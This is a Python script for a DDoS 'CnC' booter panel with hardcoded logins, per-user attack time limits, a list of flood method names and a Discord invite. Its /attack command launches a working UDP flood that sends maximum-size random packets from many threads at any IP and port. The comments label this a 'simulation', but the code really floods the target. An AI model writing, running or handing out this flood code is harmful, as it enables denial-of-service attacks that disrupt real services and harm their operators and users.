import getpass
import os
import sys
import signal
import time
import threading
import random
import socket

# Colors
WHITE = '\033[97m'
PURPLE = '\033[95m'
RESET = '\033[0m'

# Valid users
users = {
    "Learn": {
        "password": "LearnXD",
        "rank": "Admin",
        "maxtime": 300
    },
    "FlackModder": {
        "password": "Flack",
        "rank": "Ópalo",
        "maxtime": 60
    },
    "Asky": {
        "password": "Asky",
        "rank": "Ópalo",
        "maxtime": 60
    },
    "Zyper": {
        "password": "ZyperGay",
        "rank": "Ópalo",
        "maxtime": 60
    }
}

connected_users = {}
command_logs = []

methods = [
    "UDPGOOD", "UDPPPS", "DNSBOTNET", "DISCORD-CALL", "UDPRAW",
    "UDPGAME", "TCPBYPASS", "UDPBYPASS", "TCPROXIES"
]

# Block Ctrl+Z and Ctrl+C
def signal_handler(sig, frame):
    print(f"\n{PURPLE}You cannot exit this CnC like that.{RESET}")
signal.signal(signal.SIGTSTP, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(PURPLE + r"""
▒█████    ██████  ▄▄▄       ██▓  ██████     ▄████▄   ███▄    █  ▄████▄  
▒██▒  ██▒▒██    ▒ ▒████▄    ▓██▒▒██    ▒    ▒██▀ ▀█   ██ ▀█   █ ▒██▀ ▀█  
▒██░  ██▒░ ▓██▄   ▒██  ▀█▄  ▒██▒░ ▓██▄      ▒▓█    ▄ ▓██  ▀█ ██▒▒▓█    ▄ 
▒██   ██░  ▒   ██▒░██▄▄▄▄██ ░██░  ▒   ██▒   ▒▓▓▄ ▄██▒▓██▒  ▐▌██▒▒▓▓▄ ▄██▒
░ ████▓▒░▒██████▒▒ ▓█   ▓██▒░██░▒██████▒▒   ▒ ▓███▀ ░▒██░   ▓██░▒ ▓███▀ ░
░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▓  ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░
  ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░ ▒ ░░ ░▒  ░ ░     ░  ▒   ░ ░░   ░ ▒░  ░  ▒   
░ ░ ░ ▒  ░  ░  ░    ░   ▒    ▒ ░░  ░  ░     ░           ░   ░ ░ ░        
    ░ ░        ░        ░  ░ ░        ░     ░ ░               ░ ░ ░      
                                            ░                   ░        
""")
    print(f"{WHITE}Discord: [ https://discord.gg/m37h29C2MX ]")
    print(f"{WHITE}Use Help & ? to view the CnC commands\n")

def login():
    while True:
        username = input(f"{WHITE}username: ").strip()
        password = getpass.getpass(f"{WHITE}password: ").strip()

        if username in users and users[username]["password"] == password:
            connected_users[username] = True
            clear()
            banner()
            return username
        else:
            print(f"{PURPLE}Incorrect credentials. Please try again.{RESET}")

# Function to simulate the attack
def attack(user, ip, port, time_, method):
    if ip == "127.0.0.1":
        print(f"{PURPLE}You cannot attack 127.0.0.1{RESET}")
        return

    if method not in methods:
        print(f"{PURPLE}Invalid method.{RESET}")
        return

    maxtime = users[user]["maxtime"]
    if int(time_) > maxtime:
        print(f"{PURPLE}Time limit exceeded. Your max time is {maxtime}s.{RESET}")
        return

    # Attack simulation
    threading.Thread(target=send_attack, args=(ip, port, time_)).start()

    command_logs.append(f"{user} -> /attack {ip} {port} {time_} {method}")
    print(f"{PURPLE}Broadcasted instructions sent to API.{RESET}")

# Function to simulate sending attack packets
def send_attack(ip, port, time_):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.settimeout(1)

        # Increase packet size to enhance attack power
        byte_data = random._urandom(65535)  # Max UDP packet size
        start_time = time.time()
        while time.time() - start_time < int(time_):
            client.sendto(byte_data, (ip, int(port)))

            # Use multiple threads to simulate more intense attack
            threading.Thread(target=client.sendto, args=(byte_data, (ip, int(port)))).start()

    except Exception as e:
        print(f"{PURPLE}Error: {e}{RESET}")

def handle_command(user):
    while True:
        cmd = input(f"{PURPLE}Osais•CnC>> {WHITE}").strip()

        if cmd in ["help", "?"]:
            print(f"{WHITE}Commands")
            print(f"{PURPLE}methods")
            print(f"{PURPLE}/attack <ip> <port> <time> <method>{RESET}")
        elif cmd.startswith("/attack"):
            try:
                _, ip, port, time_, method = cmd.split()
                attack(user, ip, port, time_, method.upper())
            except:
                print(f"{PURPLE}Incorrect usage. /attack <ip> <port> <time> <method>{RESET}")
        elif cmd == ".info":
            print(f"{PURPLE}User: {WHITE}{user}")
            print(f"{PURPLE}Rank: {WHITE}{users[user]['rank']}")
            print(f"{PURPLE}Time: {WHITE}{users[user]['maxtime']}s")
            print(f"{PURPLE}Don't attack gov/mil/school or you will be banned from the CnC since it is prohibited...{RESET}")
        elif cmd == ".connects":
            if users[user]["rank"] != "Admin":
                print(f"{PURPLE}You don't have permission for this command.{RESET}")
                continue
            for u in users:
                status = "[ON]" if connected_users.get(u, False) else "[OFF]"
                print(f"{PURPLE}User: {WHITE}{u} {status}")
        elif cmd == ".logs":
            if users[user]["rank"] != "Admin":
                print(f"{PURPLE}You don't have permission for this command.{RESET}")
                continue
            for log in command_logs:
                print(f"{WHITE}{log}")
        elif cmd == "cls":
            clear()
            banner()
        else:
            print(f"{PURPLE}Command not recognized.{RESET}")

if __name__ == "__main__":
    user = login()
    handle_command(user)
